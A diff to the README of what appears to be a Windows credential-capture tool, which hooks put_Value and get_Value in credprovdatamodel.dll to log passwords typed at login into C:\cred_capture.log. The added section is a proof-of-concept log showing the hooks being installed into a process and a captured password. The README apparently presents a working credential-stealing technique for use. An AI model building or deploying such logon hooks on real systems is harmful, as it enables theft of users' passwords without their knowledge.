@@ -39,3 +39,17 @@ Functions are resolved by **byte pattern scan** over the `.text` section of `Cre
 - Sign out or restart
 - Login
 - Check the **C:\cred_capture.log** with the entered password
+
+## Proof of Concept
+```
+<<>> ATTACH PID=11712
+<<>> installing hooks
+<<>> credprovdatamodel.dll @ 0x00007FFE30650000
+<<>> scanning .text @ 0x00007FFE30651000 size=0x77B45
+<<>> put_Value found @ 0x00007FFE3067BD70
+<<>> get_Value found @ 0x00007FFE3068ADF0
+<<>> hooks OK
+
+[CRED] 2026-10-12 10:07:04
+  password: 1234
+```
